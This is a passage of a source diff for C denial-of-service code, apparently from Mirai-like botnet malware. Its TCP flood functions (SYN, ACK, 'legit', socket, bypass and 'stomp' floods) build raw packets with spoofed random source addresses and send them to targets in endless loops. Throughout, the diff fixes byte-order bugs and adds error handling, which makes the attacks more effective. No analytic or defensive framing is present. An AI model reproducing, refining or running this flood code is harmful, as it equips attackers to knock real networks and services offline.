@@ -18,13 +18,27 @@
 #include "checksum.h"
 #include "rand.h"
 
-
 #define NONBLOCK(fd) fcntl(fd, F_SETFL, fcntl(fd, F_GETFL) | O_NONBLOCK)
+
+static void cleanup_tcp_attack(char **pkts, int targs_len, int fd) {
+    if (pkts) {
+        for (int i = 0; i < targs_len; i++) {
+            if (pkts[i]) {
+                free(pkts[i]);
+            }
+        }
+        free(pkts);
+    }
+    if (fd >= 0) {
+        close(fd);
+    }
+}
 
 void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
+    int i, fd = -1;
+    char **pkts = NULL;
+    
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
     uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
@@ -50,13 +64,20 @@ void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t op
 #endif
         return;
     }
+    
     i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
 #endif
-        close(fd);
+        cleanup_tcp_attack(NULL, 0, fd);
+        return;
+    }
+
+    pkts = calloc(targs_len, sizeof(char *));
+    if (!pkts) {
+        cleanup_tcp_attack(NULL, 0, fd);
         return;
     }
 
@@ -66,7 +87,12 @@ void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t op
         struct tcphdr *tcph;
         char *payload;
 
-        pkts[i] = calloc(1510, sizeof (char));
+        pkts[i] = calloc(1510, sizeof(char));
+        if (!pkts[i]) {
+            cleanup_tcp_attack(pkts, targs_len, fd);
+            return;
+        }
+        
         iph = (struct iphdr *)pkts[i];
         tcph = (struct tcphdr *)(iph + 1);
         payload = (char *)(tcph + 1);
@@ -74,7 +100,7 @@ void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t op
         iph->version = 4;
         iph->ihl = 5;
         iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
         iph->id = htons(ip_ident);
         iph->ttl = ip_ttl;
         if (dont_frag)
@@ -85,7 +111,7 @@ void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t op
 
         tcph->source = htons(sport);
         tcph->dest = htons(dport);
-        tcph->seq = htons(seq);
+        tcph->seq = htonl(seq);
         tcph->doff = 5;
         tcph->urg = urg_fl;
         tcph->ack = ack_fl;
@@ -93,9 +119,7 @@ void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t op
         tcph->rst = rst_fl;
         tcph->syn = syn_fl;
         tcph->fin = fin_fl;
-        tcph->window = rand_next() & 0xffff;
-        if (psh_fl)
-            tcph->psh = TRUE;
+        tcph->window = htons(rand_next() & 0xffff);
 
         rand_str(payload, data_len);
     }
@@ -104,6 +128,8 @@ void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t op
     {
         for (i = 0; i < targs_len; i++)
         {
+            if (!pkts[i]) continue;
+            
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
@@ -115,33 +141,37 @@ void attack_tcp_legit(uint8_t targs_len, struct attack_target *targs, uint8_t op
             if (source_ip == 0xffffffff)
                 iph->saddr = rand_next();
             if (ip_ident == 0xffff)
-                iph->id = rand_next() & 0xffff;
+                iph->id = htons(rand_next() & 0xffff);
             if (sport == 0xffff)
-                tcph->source = rand_next() & 0xffff;
+                tcph->source = htons(rand_next() & 0xffff);
             if (dport == 0xffff)
-                tcph->dest = rand_next() & 0xffff;
+                tcph->dest = htons(rand_next() & 0xffff);
             if (seq == 0xffff)
-                tcph->seq = rand_next();
+                tcph->seq = htonl(rand_next());
             if (ack == 0xffff)
-                tcph->ack_seq = rand_next();
+                tcph->ack_seq = htonl(rand_next());
             if (data_rand)
                 rand_str(data, data_len);
 
             iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
 
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
+            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);
 
             targs[i].sock_addr.sin_port = tcph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, 
+                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
         }
 #ifdef DEBUG
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+        if (errno != 0)
+            printf("errno = %d\n", errno);
 #endif
     }
+    
+    cleanup_tcp_attack(pkts, targs_len, fd);
 }
+
 void attack_tcp_socket(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
     uint16_t size = 0;
@@ -152,6 +182,7 @@ void attack_tcp_socket(uint8_t targs_len, struct attack_target *targs, uint8_t o
 
     struct sockaddr_in addr;
     char *buf = (char *)malloc(size);
+    if (!buf) return;
 
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
@@ -166,9 +197,7 @@ void attack_tcp_socket(uint8_t targs_len, struct attack_target *targs, uint8_t o
         uint32_t timeout;
     } states[MAX_FDS];
 
-    int clear = 0;
-
-    for(clear = 0; clear < MAX_FDS; clear++)
+    for (int clear = 0; clear < MAX_FDS; clear++)
     {
         states[clear].fd = -1;
         states[clear].state = 0;
@@ -177,14 +206,11 @@ void attack_tcp_socket(uint8_t targs_len, struct attack_target *targs, uint8_t o
 
     while(1)
     {
-        int i = 0;
         fd_set write_set;
         struct timeval timeout;
-        int fds = 0;
-        socklen_t err = 0;
-        int err_len = sizeof(int);
+        socklen_t err_len = sizeof(int);
 
-        for(i = 0; i < MAX_FDS; i++)
+        for(int i = 0; i < MAX_FDS; i++)
         {
             switch(states[i].state)
             {
@@ -198,38 +224,41 @@ void attack_tcp_socket(uint8_t targs_len, struct attack_target *targs, uint8_t o
                     if(connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS)
                     {
                         close(states[i].fd);
+                        states[i].fd = -1;
                         states[i].timeout = 0;
                         continue;
                     }
                     states[i].state = 1;
                     states[i].timeout = time(NULL);
                     break;
+                    
                 case 1:
+                {
+                    int err = 0;
                     FD_ZERO(&write_set);
                     FD_SET(states[i].fd, &write_set);
 
                     timeout.tv_usec = 10;
                     timeout.tv_sec = 0;
 
-                    fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
+                    int fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
                     if(fds == 1)
                     {
-                        getsockopt(states[i].fd, SOL_SOCKET,SO_ERROR, &err, &err_len);
-
+                        getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                         if(err)
                         {
                             close(states[i].fd);
+                            states[i].fd = -1;
                             states[i].state = 0;
                             states[i].timeout = 0;
                             continue;
                         }
-
                         states[i].state = 2;
-                        continue;
                     }
                     else if(fds == -1)
                     {
                         close(states[i].fd);
+                        states[i].fd = -1;
                         states[i].state = 0;
                         states[i].timeout = 0;
                     }
@@ -237,43 +266,50 @@ void attack_tcp_socket(uint8_t targs_len, struct attack_target *targs, uint8_t o
                     if(states[i].timeout + 5 < time(NULL))
                     {
                         close(states[i].fd);
+                        states[i].fd = -1;
                         states[i].state = 0;
                         states[i].timeout = 0;
                     }
                     break;
+                }
+                    
                 case 2:
-                    if(size == 1)
-                        size = 500 + rand() % 400; 
-                    else
-                        size = size;
-
-                    rand_str((unsigned char*)buf, size);
-
-                    if(send(states[i].fd, buf, size, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
+                {
+                    uint16_t send_size = size;
+                    if(send_size == 1)
+                        send_size = 500 + (rand_next() % 400);
+                        
+                    rand_str((unsigned char*)buf, send_size);
+                    if(send(states[i].fd, buf, send_size, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
                     {
                         close(states[i].fd);
+                        states[i].fd = -1;
                         states[i].state = 0;
                         states[i].timeout = 0;
                     }
                     break;
+                }
             }
         }
     }
-
-    return;
+    
+    free(buf);
+    for (int i = 0; i < MAX_FDS; i++) {
+        if (states[i].fd >= 0) {
+            close(states[i].fd);
+        }
+    }
 }
-
 
 void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-
     BOOL rand_len = attack_get_opt_int(opts_len, opts, ATK_OPT_RAND_LEN, TRUE);
-
     uint16_t len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 900); 
     uint16_t port = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
 
     struct sockaddr_in addr;
     char *buf = calloc(len, sizeof(char));
+    if (!buf) return;
 
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
@@ -286,8 +322,6 @@ void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t o
         uint32_t timeout;
     } states[MAX_FDS];
 
-    int clear = 0;
-
     for (int i = 0; i < MAX_FDS; i++)
     {
         states[i].fd = -1;
@@ -297,14 +331,11 @@ void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t o
 
     while (TRUE)
     {
-        int i = 0;
         fd_set write_set;
         struct timeval timeout;
-        int fds = 0;
-        socklen_t err = 0;
-        int err_len = sizeof(int);
+        socklen_t err_len = sizeof(int);
 
-        for(i = 0; i < MAX_FDS; i++)
+        for(int i = 0; i < MAX_FDS; i++)
         {
             switch(states[i].state)
             {
@@ -314,43 +345,44 @@ void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t o
                         continue;
                     }
                     fcntl(states[i].fd, F_SETFL, O_NONBLOCK | fcntl(states[i].fd, F_GETFL, 0));
-
                     errno = 0;
                     if(connect(states[i].fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1 || errno != EINPROGRESS)
                     {
                         close(states[i].fd);
+                        states[i].fd = -1;
                         states[i].timeout = 0;
                         continue;
                     }
                     states[i].state = 1;
                     states[i].timeout = time(NULL);
                     break;
+                    
                 case 1:
+                {
+                    int err = 0;
                     FD_ZERO(&write_set);
                     FD_SET(states[i].fd, &write_set);
-
                     timeout.tv_usec = 10;
                     timeout.tv_sec = 0;
 
-                    fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
+                    int fds = select(states[i].fd + 1, NULL, &write_set, NULL, &timeout);
                     if(fds == 1)
                     {
-                        getsockopt(states[i].fd, SOL_SOCKET,SO_ERROR, &err, &err_len);
-
+                        getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                         if(err)
                         {
                             close(states[i].fd);
+                            states[i].fd = -1;
                             states[i].state = 0;
                             states[i].timeout = 0;
                             continue;
                         }
-
                         states[i].state = 2;
-                        continue;
                     }
                     else if(fds == -1)
                     {
                         close(states[i].fd);
+                        states[i].fd = -1;
                         states[i].state = 0;
                         states[i].timeout = 0;
                     }
@@ -358,36 +390,46 @@ void attack_tcp_bypass(uint8_t targs_len, struct attack_target *targs, uint8_t o
                     if(states[i].timeout + 5 < time(NULL))
                     {
                         close(states[i].fd);
+                        states[i].fd = -1;
                         states[i].state = 0;
                         states[i].timeout = 0;
                     }
                     break;
-                case 2:
-
+                }
                     
-                    if (rand_len)
-                        len = ((rand_next() % (len - 500) + 1) + 500);
-                    else
-                        len = len;
-
-                    rand_str((unsigned char*)buf, len);
-
-                    if(send(states[i].fd, buf, len, MSG_NOSIGNAL) == -1 && errno != EAGAIN) 
+                case 2:
+                {
+                    uint16_t send_len = len;
+                    if (rand_len && len > 500)
+                        send_len = ((rand_next() % (len - 500)) + 500);
+                        
+                    rand_str((unsigned char*)buf, send_len);
+                    if(send(states[i].fd, buf, send_len, MSG_NOSIGNAL) == -1 && errno != EAGAIN) 
                     {
                         close(states[i].fd);
+                        states[i].fd = -1;
                         states[i].state = 0;
                         states[i].timeout = 0;
                     }
                     break;
+                }
             }
+        }
+    }
+    
+    free(buf);
+    for (int i = 0; i < MAX_FDS; i++) {
+        if (states[i].fd >= 0) {
+            close(states[i].fd);
         }
     }
 }
 
 void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
+    int i, fd = -1;
+    char **pkts = NULL;
+    
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
     uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
@@ -413,7 +455,7 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
     }
     
     i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
@@ -422,21 +464,32 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         return;
     }
 
+    pkts = calloc(targs_len, sizeof(char *));
+    if (!pkts) {
+        close(fd);
+        return;
+    }
+
     for (i = 0; i < targs_len; i++)
     {
         struct iphdr *iph;
         struct tcphdr *tcph;
-        uint8_t *opts;
+        uint8_t *opts_ptr;
 
-        pkts[i] = calloc(128, sizeof (char));
+        pkts[i] = calloc(128, sizeof(char));
+        if (!pkts[i]) {
+            cleanup_tcp_attack(pkts, targs_len, fd);
+            return;
+        }
+        
         iph = (struct iphdr *)pkts[i];
         tcph = (struct tcphdr *)(iph + 1);
-        opts = (uint8_t *)(tcph + 1);
+        opts_ptr = (uint8_t *)(tcph + 1);
 
         iph->version = 4;
         iph->ihl = 5;
         iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + 20);
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
         iph->id = htons(ip_ident);
         iph->ttl = ip_ttl;
         if (dont_frag)
@@ -447,7 +500,7 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
         tcph->source = htons(sport);
         tcph->dest = htons(dport);
-        tcph->seq = htons(seq);
+        tcph->seq = htonl(seq);
         tcph->doff = 10;
         tcph->urg = urg_fl;
         tcph->ack = ack_fl;
@@ -456,41 +509,37 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         tcph->syn = syn_fl;
         tcph->fin = fin_fl;
 
-        
-        *opts++ = PROTO_TCP_OPT_MSS;    
-        *opts++ = 4;                    
-        *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
-        opts += sizeof (uint16_t);
+        *opts_ptr++ = PROTO_TCP_OPT_MSS;    
+        *opts_ptr++ = 4;                    
+        *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() & 0x0f));
+        opts_ptr += sizeof(uint16_t);
 
-        
-        *opts++ = PROTO_TCP_OPT_SACK;
-        *opts++ = 2;
+        *opts_ptr++ = PROTO_TCP_OPT_SACK;
+        *opts_ptr++ = 2;
 
-        
-        *opts++ = PROTO_TCP_OPT_TSVAL;
-        *opts++ = 10;
-        *((uint32_t *)opts) = rand_next();
-        opts += sizeof (uint32_t);
-        *((uint32_t *)opts) = 0;
-        opts += sizeof (uint32_t);
+        *opts_ptr++ = PROTO_TCP_OPT_TSVAL;
+        *opts_ptr++ = 10;
+        *((uint32_t *)opts_ptr) = rand_next();
+        opts_ptr += sizeof(uint32_t);
+        *((uint32_t *)opts_ptr) = 0;
+        opts_ptr += sizeof(uint32_t);
 
-        
-        *opts++ = 1;
+        *opts_ptr++ = 1;
 
-        
-        *opts++ = PROTO_TCP_OPT_WSS;
-        *opts++ = 3;
-        *opts++ = 6; 
+        *opts_ptr++ = PROTO_TCP_OPT_WSS;
+        *opts_ptr++ = 3;
+        *opts_ptr++ = 6;
     }
 
     while (TRUE)
     {
         for (i = 0; i < targs_len; i++)
         {
+            if (!pkts[i]) continue;
+            
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
-            
             
             if (targs[i].netmask < 32)
                 iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
@@ -498,38 +547,42 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             if (source_ip == 0xffffffff)
                 iph->saddr = rand_next();
             if (ip_ident == 0xffff)
-                iph->id = rand_next() & 0xffff;
+                iph->id = htons(rand_next() & 0xffff);
             if (sport == 0xffff)
-                tcph->source = rand_next() & 0xffff;
+                tcph->source = htons(rand_next() & 0xffff);
             if (dport == 0xffff)
-                tcph->dest = rand_next() & 0xffff;
+                tcph->dest = htons(rand_next() & 0xffff);
             if (seq == 0xffff)
-                tcph->seq = rand_next();
+                tcph->seq = htonl(rand_next());
             if (ack == 0xffff)
-                tcph->ack_seq = rand_next();
+                tcph->ack_seq = htonl(rand_next());
             if (urg_fl)
-                tcph->urg_ptr = rand_next() & 0xffff;
+                tcph->urg_ptr = htons(rand_next() & 0xffff);
 
             iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
 
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
+            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);
 
             targs[i].sock_addr.sin_port = tcph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, 
+                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
         }
 #ifdef DEBUG
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+        if (errno != 0)
+            printf("errno = %d\n", errno);
 #endif
     }
+    
+    cleanup_tcp_attack(pkts, targs_len, fd);
 }
 
 void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, fd;
-    char **pkts = calloc(targs_len, sizeof (char *));
+    int i, fd = -1;
+    char **pkts = NULL;
+    
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
     uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
@@ -555,12 +608,19 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 #endif
         return;
     }
+    
     i = 1;
-    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
 #endif
+        close(fd);
+        return;
+    }
+
+    pkts = calloc(targs_len, sizeof(char *));
+    if (!pkts) {
         close(fd);
         return;
     }
@@ -571,7 +631,12 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         struct tcphdr *tcph;
         char *payload;
 
-        pkts[i] = calloc(1510, sizeof (char));
+        pkts[i] = calloc(1510, sizeof(char));
+        if (!pkts[i]) {
+            cleanup_tcp_attack(pkts, targs_len, fd);
+            return;
+        }
+        
         iph = (struct iphdr *)pkts[i];
         tcph = (struct tcphdr *)(iph + 1);
         payload = (char *)(tcph + 1);
@@ -579,7 +644,7 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         iph->version = 4;
         iph->ihl = 5;
         iph->tos = ip_tos;
-        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
+        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
         iph->id = htons(ip_ident);
         iph->ttl = ip_ttl;
         if (dont_frag)
@@ -590,7 +655,7 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
         tcph->source = htons(sport);
         tcph->dest = htons(dport);
-        tcph->seq = htons(seq);
+        tcph->seq = htonl(seq);
         tcph->doff = 5;
         tcph->urg = urg_fl;
         tcph->ack = ack_fl;
@@ -598,70 +663,65 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         tcph->rst = rst_fl;
         tcph->syn = syn_fl;
         tcph->fin = fin_fl;
-        tcph->window = rand_next() & 0xffff;
-        if (psh_fl)
-            tcph->psh = TRUE;
+        tcph->window = htons(rand_next() & 0xffff);
 
         rand_str(payload, data_len);
     }
-
-
-
-
-
-
 
     while (TRUE)
     {
         for (i = 0; i < targs_len; i++)
         {
+            if (!pkts[i]) continue;
+            
             char *pkt = pkts[i];
             struct iphdr *iph = (struct iphdr *)pkt;
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
             char *data = (char *)(tcph + 1);
 
-            
             if (targs[i].netmask < 32)
                 iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
 
             if (source_ip == 0xffffffff)
                 iph->saddr = rand_next();
             if (ip_ident == 0xffff)
-                iph->id = rand_next() & 0xffff;
+                iph->id = htons(rand_next() & 0xffff);
             if (sport == 0xffff)
-                tcph->source = rand_next() & 0xffff;
+                tcph->source = htons(rand_next() & 0xffff);
             if (dport == 0xffff)
-                tcph->dest = rand_next() & 0xffff;
+                tcph->dest = htons(rand_next() & 0xffff);
             if (seq == 0xffff)
-                tcph->seq = rand_next();
+                tcph->seq = htonl(rand_next());
             if (ack == 0xffff)
-                tcph->ack_seq = rand_next();
-
-            
+                tcph->ack_seq = htonl(rand_next());
             if (data_rand)
                 rand_str(data, data_len);
 
             iph->check = 0;
-            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
+            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
 
             tcph->check = 0;
-            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
+            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);
 
             targs[i].sock_addr.sin_port = tcph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL, 
+                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
         }
 #ifdef DEBUG
-            if (errno != 0)
-                printf("errno = %d\n", errno);
+        if (errno != 0)
+            printf("errno = %d\n", errno);
 #endif
     }
+    
+    cleanup_tcp_attack(pkts, targs_len, fd);
 }
 
 void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, rfd;
-    struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data));
-    char **pkts = calloc(targs_len, sizeof (char *));
+    int i, rfd = -1;
+    struct attack_stomp_data *stomp_data = NULL;
+    char **pkts = NULL;
+    
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
     uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
@@ -676,7 +736,6 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
     int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
     BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
 
-    
     if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
 #ifdef DEBUG
@@ -684,8 +743,9 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
 #endif
         return;
     }
+    
     i = 1;
-    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
     {
 #ifdef DEBUG
         printf("Failed to set IP_HDRINCL. Aborting\n");
@@ -694,16 +754,24 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
         return;
     }
 
-    
+    stomp_data = calloc(targs_len, sizeof(struct attack_stomp_data));
+    pkts = calloc(targs_len, sizeof(char *));
+    if (!stomp_data || !pkts) {
+        free(stomp_data);
+        free(pkts);
+        close(rfd);
+        return;
+    }
+
     for (i = 0; i < targs_len; i++)
     {
-        int fd;
+        int fd = -1;
         struct sockaddr_in addr, recv_addr;
         socklen_t recv_addr_len;
-        char pktbuf[256];
+        char pktbuf[1024];
         time_t start_recv;
 
-        stomp_setup_nums:
+    stomp_setup_nums:
 
         if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
         {
@@ -713,48 +781,44 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
             continue;
         }
 
-        
         fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
  
-        
         addr.sin_family = AF_INET;
         if (targs[i].netmask < 32)
             addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
         else
             addr.sin_addr.s_addr = targs[i].addr;
         if (dport == 0xffff)
-            addr.sin_port = rand_next() & 0xffff;
+            addr.sin_port = htons(rand_next() & 0xffff);
         else
             addr.sin_port = htons(dport);
 
-        
-        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+        connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
         start_recv = time(NULL);
 
-        
         while (TRUE)
         {
             int ret;
-
-            recv_addr_len = sizeof (struct sockaddr_in);
-            ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
+            recv_addr_len = sizeof(struct sockaddr_in);
+            ret = recvfrom(rfd, pktbuf, sizeof(pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
             if (ret == -1)
             {
 #ifdef DEBUG
                 printf("Could not listen on raw socket!\n");
 #endif
-                return;
+                close(fd);
+                goto cleanup_and_return;
             }
-            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
+            
+            if (ret > 0 && recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof(struct iphdr) + sizeof(struct tcphdr)))
             {
-                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));
-
+                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));
                 if (tcph->source == addr.sin_port)
                 {
                     if (tcph->syn && tcph->ack)
                     {
                         struct iphdr *iph;
-                        struct tcphdr *tcph;
+                        struct tcphdr *tcph_pkt;
                         char *payload;
 
                         stomp_data[i].addr = addr.sin_addr.s_addr;
@@ -766,15 +830,20 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
                         printf("ACK Stomp got SYN+ACK!\n");
 #endif
                         
-                        pkts[i] = malloc(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
+                        pkts[i] = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
+                        if (!pkts[i]) {
+                            close(fd);
+                            goto cleanup_and_return;
+                        }
+                        
                         iph = (struct iphdr *)pkts[i];
-                        tcph = (struct tcphdr *)(iph + 1);
-                        payload = (char *)(tcph + 1);
+                        tcph_pkt = (struct tcphdr *)(iph + 1);
+                        payload = (char *)(tcph_pkt + 1);
 
                         iph->version = 4;
                         iph->ihl = 5;
                         iph->tos = ip_tos;
-                        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
+                        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                         iph->id = htons(ip_ident);
                         iph->ttl = ip_ttl;
                         if (dont_frag)
